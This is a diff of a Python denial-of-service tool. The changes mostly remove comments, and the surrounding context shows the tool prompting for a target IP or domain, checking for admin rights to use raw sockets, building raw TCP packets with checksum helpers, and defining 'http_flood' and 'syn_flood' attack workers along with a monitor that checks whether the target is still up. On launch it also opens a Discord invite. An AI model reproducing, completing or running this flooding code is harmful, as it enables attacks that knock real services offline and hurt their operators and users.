@@ -16,11 +16,10 @@ import threading
 import sys
 import os
 import signal
-import webbrowser          # <-- added to open Discord link
+import webbrowser        
 from datetime import datetime
 
-# ========================= UI (from second script) =========================
-_current_green = 255
+
 _fade_duration = 60.0
 
 def set_fade_ratio(elapsed: float):
@@ -54,12 +53,12 @@ for idx, line in enumerate(banner_lines):
     green_val = int(255 * (1 - idx / max(1, len(banner_lines)-1)))
     print(col_green(line, green_val))
 
-# ---------- Open Discord invite link ----------
+
 print(col_green("\n[+] Opening Discord invite link..."))
 webbrowser.open("https://discord.gg/Z9nc6sAFyw")
-# ==============================================
 
-# ========================= ADMIN CHECK =========================
+
+
 def is_admin() -> bool:
     if sys.platform == "win32":
         try:
@@ -76,7 +75,7 @@ if not admin:
 else:
     print(col_green("[+] Running with admin/root privileges. Raw sockets available.", 200))
 
-# ========================= TARGET INPUT =========================
+
 target = input(col_green("[?] Target IP or domain > ")).strip()
 if not target:
     print(col_green("[!] No target. Exiting."))
@@ -99,13 +98,12 @@ except socket.gaierror:
     print(col_green("[!] Cannot resolve hostname."))
     sys.exit(1)
 
-# Base URL for HTTP requests
 BASE_URL = f"http://{target_ip}:{port}"
 
 stop_event = threading.Event()
 target_alive = True
 
-# Extended stats: for HTTP we track success, failed, total_ms
+
 stats = {
     "http_success": 0,
     "http_failed": 0,
@@ -115,7 +113,7 @@ stats = {
 }
 stats_lock = threading.Lock()
 
-# ========================= RAW SOCKET HELPERS (from second script) =========================
+
 def create_raw_socket():
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
@@ -174,7 +172,7 @@ def tcp_checksum(ip_header, tcp_header, payload):
         pseudo_header += b'\x00'
     return checksum(pseudo_header)
 
-# ========================= ATTACK WORKERS =========================
+
 def http_flood():
     """HTTP flood using requests library (with success/fail & timing)"""
     session = requests.Session()
@@ -267,7 +265,7 @@ def syn_flood():
             pass
     raw_sock.close()
 
-# ========================= MONITOR (enhanced with HTTP metrics) =========================
+
 def monitor():
     global target_alive
     start_time = time.time()
@@ -302,7 +300,7 @@ def monitor():
         last_stats = cur
         last_time = time.time()
 
-        # Optional health check (TCP connect)
+
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1.5)
